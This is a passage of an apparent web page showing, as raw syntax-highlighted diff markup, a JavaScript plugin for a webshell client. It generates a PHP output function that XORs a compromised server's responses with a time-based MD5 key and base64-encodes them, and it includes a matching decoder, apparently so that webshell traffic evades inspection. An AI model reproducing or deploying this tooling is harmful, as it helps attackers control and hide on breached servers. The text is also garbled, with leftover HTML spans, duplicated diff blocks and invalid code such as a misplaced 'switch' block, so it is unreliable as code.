+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">code</span> <span class="n">by</span> <span class="n">yzddmr6</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="o">/**</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="n">returns</span> <span class="p">{</span><span class="n">string</span><span class="p">}</span> <span class="n">asenc</span> <span class="err">将返回数据</span><span class="n">base64编码</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">自定义输出函数名称必须为</span> <span class="n">asenc</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">该函数使用的语法需要和</span><span class="n">shell保持一致</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*/</span>
+</span></span><span class="line"><span class="cl">  <span class="n">asoutput</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="err">`</span><span class="n">function</span> <span class="n">asenc</span><span class="p">(</span><span class="o">$</span><span class="n">out</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">      <span class="n">date_default_timezone_set</span><span class="p">(</span><span class="s2">&#34;PRC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="o">$</span><span class="n">key</span><span class="o">=</span><span class="n">md5</span><span class="p">(</span><span class="n">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i&#34;</span><span class="p">,</span><span class="n">time</span><span class="p">()));</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">$</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">out</span><span class="p">);</span><span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">          <span class="o">$</span><span class="n">out</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">$</span><span class="n">out</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="o">$</span><span class="n">key</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="o">%</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="err">@</span><span class="n">base64_encode</span><span class="p">(</span><span class="o">$</span><span class="n">out</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span>\<span class="n">n</span>\<span class="n">s</span><span class="o">+/</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="o">/**</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">解码</span> <span class="n">Buffer</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="n">param</span> <span class="p">{</span><span class="n">string</span><span class="p">}</span> <span class="n">data</span> <span class="err">要被解码的</span> <span class="n">Buffer</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="n">returns</span> <span class="p">{</span><span class="n">string</span><span class="p">}</span> <span class="err">解码后的</span> <span class="n">Buffer</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*/</span>
+</span></span><span class="line"><span class="cl">  <span class="n">decode_buff</span><span class="p">:</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ext</span><span class="o">=</span><span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">xor</span><span class="p">(</span><span class="n">payload</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">crypto</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="ne">Object</span><span class="o">.</span><span class="n">assign</span><span class="p">(</span><span class="n">Date</span><span class="o">.</span><span class="n">prototype</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">switch</span> <span class="p">(</span><span class="n">time</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="n">let</span> <span class="n">date</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;yy&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getFullYear</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;MM&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getMonth</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;dd&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getDate</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;hh&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getHours</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;mm&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getMinutes</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                  <span class="s2">&#34;ss&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">getSeconds</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">              <span class="p">};</span>
+</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="o">/</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="p">)</span><span class="o">/</span><span class="n">i</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">time</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getFullYear</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">RegExp</span><span class="o">.$</span><span class="mf">1.</span><span class="n">length</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="cl">              <span class="ne">Object</span><span class="o">.</span><span class="n">keys</span><span class="p">(</span><span class="n">date</span><span class="p">)</span><span class="o">.</span><span class="n">forEach</span><span class="p">(</span><span class="n">function</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="n">new</span> <span class="n">RegExp</span><span class="p">(</span><span class="s2">&#34;(&#34;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;)&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">time</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                      <span class="k">if</span> <span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mf">1.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="err">?</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">:</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">RegExp</span><span class="o">.$</span><span class="mi">1</span><span class="p">,</span> <span class="n">date</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">              <span class="p">})</span>
+</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">time</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">})</span>
 </span></span><span class="line"><span class="cl">      
-</span></span><span class="line"><span class="cl">      let newDate = new Date();
-</span></span><span class="line"><span class="cl">      let time = newDate.switch(&#39;yyyy-MM-dd hh:mm&#39;);
-</span></span><span class="line"><span class="cl">      let key = crypto.createHash(&#39;md5&#39;).update(time).digest(&#39;hex&#39;)
-</span></span><span class="line"><span class="cl">      key = key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">      let data = payload;
-</span></span><span class="line"><span class="cl">      let cipher=Buffer.from(data.toString(), &#39;base64&#39;).toString();
-</span></span><span class="line"><span class="cl">      cipher = cipher.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">      for (let i = 0; i &lt; cipher.length; i++) {
-</span></span><span class="line"><span class="cl">          cipher[i] = cipher[i] ^ key[i % 32]
-</span></span><span class="line"><span class="cl">      }
-</span></span><span class="line"><span class="cl">      cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&#34;&#34;)
-</span></span><span class="line"><span class="cl">      return cipher;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    return xor(data);
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">newDate</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Date</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">time</span> <span class="o">=</span> <span class="n">newDate</span><span class="o">.</span><span class="k">switch</span><span class="p">(</span><span class="s1">&#39;yyyy-MM-dd hh:mm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">key</span> <span class="o">=</span> <span class="n">crypto</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">time</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">cipher</span><span class="o">=</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">toString</span><span class="p">(),</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="n">cipher</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cipher</span><span class="o">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">32</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">cipher</span><span class="o">=</span><span class="n">cipher</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span><span class="o">=&gt;</span><span class="ne">String</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">t</span><span class="p">))</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">cipher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">xor</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png">
